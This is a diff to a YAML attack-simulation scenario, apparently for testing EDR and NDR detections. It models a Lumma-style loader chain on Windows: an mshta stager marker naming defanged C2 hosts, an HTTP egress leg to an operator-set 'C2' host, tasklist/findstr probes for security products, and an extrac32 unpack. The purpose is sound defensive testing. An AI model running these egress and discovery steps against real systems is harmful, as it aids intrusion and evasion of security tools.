@@ -108,44 +108,48 @@ cgo_anchor:
 external_tools: []
 
 steps:
+  # CONT-04: step-01 used to be a marker-only mshta-fetch model whose only
+  # declared detection was the NDR egress hunt, which nothing it sent could
+  # match. It is folded into the discovery step below (the stdlib lint hook, and
+  # the corpus, require every step to declare at least one detection), so the
+  # chain is three steps: discovery (root), extrac32 unpack, stitch check.
   - id: step-01
-    name: "mshta remote fetch of the loader stager (SAFE-MODE model + egress shape)"
+    name: "mshta stager model + AV/EDR product discovery via tasklist piped to findstr (real benign LOLBins)"
     command: |
       $s = Join-Path $env:TEMP 'cortexsim-edr-017'
       New-Item -ItemType Directory -Force -Path $s | Out-Null
       Set-Content -Path (Join-Path $s 'SAFE-MODE-mshta-fetch.marker') -Value 'CortexSim SIM-EDR-017 SAFE-MODE marker: models mshta.exe proxying a remote fetch of an encoded PowerShell downloader (mshta hxxps://iplogger[.]co/xxxxx =+) that hands off to a cmd.exe loader. No fetch performed and mshta is not invoked.'
-      $h = if ($env:CORTEXSIM_C2_HOST) { $env:CORTEXSIM_C2_HOST } else { '127.0.0.1' }
-      try { Invoke-WebRequest -UseBasicParsing -TimeoutSec 5 -Uri ("http://{0}/party" -f $h) | Out-Null } catch {}
+      # The egress leg runs only against an operator-named lab host. It used to
+      # default to 127.0.0.1 inside an empty catch {}: loopback never crosses
+      # the NGFW and a failure read as success. A named host that does not
+      # answer now fails the step.
+      $h = $env:CORTEXSIM_C2_HOST
+      if ($h) {
+        try { Invoke-WebRequest -UseBasicParsing -TimeoutSec 5 -Uri ("http://{0}/party" -f $h) -ErrorAction Stop | Out-Null }
+        catch { Write-Error ("stager egress to {0} failed: {1}" -f $h, $_.Exception.Message); exit 1 }
+        Write-Host ("cortexsim-edr-017-stager-egress-sent host={0}" -f $h)
+      } else {
+        Write-Host 'cortexsim-edr-017 egress leg NOT exercised: CORTEXSIM_C2_HOST is unset (point it at a lab host whose name the NDR hunt matches, e.g. a sinkholed pub-<x>.r2.dev)'
+      }
       Write-Host 'cortexsim-edr-017-mshta-fetch-modelled'
-    identity: user
-    mitre_technique: "T1218.014"
-    # Root step — the mshta stager is spawned by the explorer.exe paste (CGO).
-    # Windows-only LOLBin tradecraft (mshta/extrac32/AutoIt3), no cross-OS variant.
-    platforms: ["windows"]
-    # The mshta-fetch loader ABIOC is MODEL-ONLY (no mshta.exe is spawned under
-    # SAFE-MODE), so it is NOT asserted here — only the network egress this step
-    # actually produces (Invoke-WebRequest to the authorised host) is asserted.
-    expected_detections:
-      - plane: NDR
-        type: XQL
-        description: "Network-plane hunt surfaces the loader stager fetch (pub-*.r2.dev) and Lumma C2 egress (sumeriavgv[.]digital) — the modelled egress shape observable to the NGFW / NDR plane."
-        ttp_ref: "TTP-2026-0129"
-        detection_id: "xql-loader-stager-fetch-and-lumma-c2-egress-on-the-network-plane"
-
-  - id: step-02
-    name: "AV/EDR product discovery via tasklist piped to findstr (real benign LOLBins)"
-    command: |
       cmd.exe /c "tasklist | findstr /I ""opssvc wrsa"""
       cmd.exe /c "tasklist | findstr /I ""bdservicehost SophosHealth AvastUI AVGUI nsWscSvc ekrn"""
+      # findstr exits 1 on no match — the expected result on a clean host —
+      # and fail-fast read that as a failed step, killing the rest of the
+      # chain. The probe is the TTP; its exit code is not (SIM-MP-029 precedent).
+      $global:LASTEXITCODE = 0
       Write-Host 'cortexsim-edr-017-av-edr-discovery-probe-complete'
     identity: user
     mitre_technique: "T1518.001"
-    # The cmd loader stage running the AV/EDR discovery probe is forked by the
-    # mshta stager (step-01) — a real process-create, so pivot is process_lineage.
-    causality:
-      parent_step: step-01
-      pivot: process_lineage
+    # Root step — the stager is spawned by the explorer.exe paste (CGO).
+    # Windows-only LOLBin tradecraft (mshta/extrac32/AutoIt3), no cross-OS variant.
     platforms: ["windows"]
+    # Not asserted: the mshta-fetch loader ABIOC is MODEL-ONLY (no mshta.exe is
+    # spawned under SAFE-MODE), and the NDR egress hunt keys on dst_host r2.dev /
+    # iplogger.co / sumeriavgv.digital, which nothing this step sends by default
+    # can match (the SIM-KOI-009 precedent). Both stay on TTP-2026-0129;
+    # CR-EDR-0017 does not need the hunt (its network leg is an OR with the
+    # extrac32 query).
     expected_detections:
       - plane: EDR
         type: ABIOC
@@ -158,11 +162,14 @@ steps:
         ttp_ref: "TTP-2026-0129"
         detection_id: "xql-tasklist-to-findstr-security-product-discovery-command-line"
 
-  - id: step-03
+  - id: step-02
     name: "extrac32 CAB unpack (real benign) + masqueraded signed AutoIt3 (SAFE-MODE model)"
     command: |
       $s = Join-Path $env:TEMP 'cortexsim-edr-017'
-      cmd.exe /c "md $s\386354" 2>$null
+      # cmd redirects its own stderr: a PowerShell `2>$null` on a native command
+      # turns stderr into a terminating error under Windows PowerShell 5.1 with
+      # ErrorActionPreference=Stop (the push bundle's setting).
+      cmd.exe /c "md $s\386354 2>nul"
       # REAL but BENIGN: author a local CAB then unpack it with extrac32 for
       # genuine unpack telemetry (extrac32 reads the archive by header, not
       # extension — exactly the tradecraft). No malicious archive is fetched.
@@ -177,9 +184,9 @@ steps:
     identity: user
     mitre_technique: "T1036.005"
     # The extrac32 unpack + masqueraded-AutoIt3 stage continues the same cmd
-    # loader lineage from step-02 — real process-create forks, pivot process_lineage.
+    # loader lineage from step-01 — real process-create forks, pivot process_lineage.
     causality:
-      parent_step: step-02
+      parent_step: step-01
       pivot: process_lineage
     platforms: ["windows"]
     # The extrac32->masqueraded-AutoIt3 grouping ABIOC (distinct_stages >= 2) is
@@ -193,7 +200,7 @@ steps:
         ttp_ref: "TTP-2026-0129"
         detection_id: "xql-extrac32-unpack-and-renamed-autoit3-interpreter-execution-surfaced"
 
-  - id: step-04
+  - id: step-03
     name: "Correlation stitches the loader chain into one Lumma-loader incident spanning EDR + NDR"
     command: |
       Write-Host '[SIM-EDR-017] Stitch verification — allow the XSIAM correlation engine to converge'
@@ -201,13 +208,16 @@ steps:
       Start-Sleep -Seconds $w
       Write-Host '[*] Expected: CR-EDR-0017 raises ONE incident whose causality chain spans EDR (LOLBin lineage) + NDR (stager/C2 egress)'
       Write-Host 'cortexsim-edr-017-cr-edr-0017-stitched-lumma-loader-incident'
+      # Last step: a pull run never executes scenario cleanup, so the stage
+      # directory steps 01-02 wrote is removed here.
+      Remove-Item -Recurse -Force -ErrorAction SilentlyContinue -Path (Join-Path $env:TEMP 'cortexsim-edr-017')
     identity: user
     mitre_technique: "T1059.003"
     # Terminal stitch — joins the endpoint loader lineage (steps 01-03) to the
     # NDR stager/C2 egress: endpoint-signal <-> firewall-session, so the pivot
     # is endpoint_network_stitch.
     causality:
-      parent_step: step-03
+      parent_step: step-02
       pivot: endpoint_network_stitch
     platforms: ["windows"]
     expected_detections:
